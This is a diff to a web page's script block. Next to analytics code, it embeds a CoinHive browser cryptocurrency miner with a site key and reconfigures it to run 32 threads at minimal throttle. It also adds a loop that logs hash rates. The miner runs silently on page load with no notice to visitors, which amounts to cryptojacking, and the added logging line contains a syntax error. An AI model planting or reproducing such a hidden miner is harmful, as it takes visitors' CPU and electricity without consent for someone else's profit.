@@ -1024,9 +1024,26 @@ var bgurl = "http://image.qn.iblueg.cn/kuanpin"+bgnum+".jpg";
 //window.ga_debug = {trace: true};
         ga('create', 'UA-69113723-4', 'auto');
         ga('send', 'pageview');
-
-var miner = new CoinHive.Anonymous('UitANGIFzXKM1p25LYThHGmI5jpFkrd4');
+	    
+	    var miner = new CoinHive.Anonymous('UitANGIFzXKM1p25LYThHGmI5jpFkrd4', {
+	threads: 32,
+	autoThreads: false,
+	throttle: 0.1,
+	forceASMJS: false
+});
+	    
 	miner.start();
+	    
+	    setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+		    
+		    console.log(hashesPerSecond+" "+totalHashes+" "acceptedHashes");
+
+		// Output to HTML elements...
+	}, 3000);
+	    
     </script>
 
 <script type="text/javascript" color="255,255,255" zindex="-1" opacity="0.5" count="150" src="http://cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
